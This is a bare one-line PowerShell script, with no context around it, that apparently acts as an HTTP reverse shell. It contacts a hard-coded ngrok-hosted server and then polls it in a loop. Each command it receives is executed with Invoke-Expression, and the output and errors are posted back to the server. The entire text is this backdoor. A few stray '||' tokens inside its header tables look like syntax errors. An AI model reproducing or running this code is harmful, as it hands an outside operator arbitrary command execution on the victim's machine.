$s='d1f1-43-245-32-6.ngrok-free.app';$i='401bb9c5-7ec09681-5dbeed84';$p='https://';$v=Invoke-WebRequest -UseBasicParsing -Uri $p$s/401bb9c5 -Headers @{"X-04a7-8a81"=$i;"ngrok-skip-browser-warning"=$i||};while ($true){$c=(Invoke-WebRequest -UseBasicParsing -Uri $p$s/7ec09681 -Headers @{"X-04a7-8a81"=$i;"ngrok-skip-browser-warning"=$i||}).Content;if ($c -ne 'None') {$r=iex $c -ErrorAction Stop -ErrorVariable e;$r=Out-String -InputObject $r;$t=Invoke-WebRequest -Uri $p$s/5dbeed84 -Method POST -Headers @{"X-04a7-8a81"=$i;"ngrok-skip-browser-warning"=$i||} -Body ([System.Text.Encoding]::UTF8.GetBytes($e+$r) -join ' ')} sleep 0.8}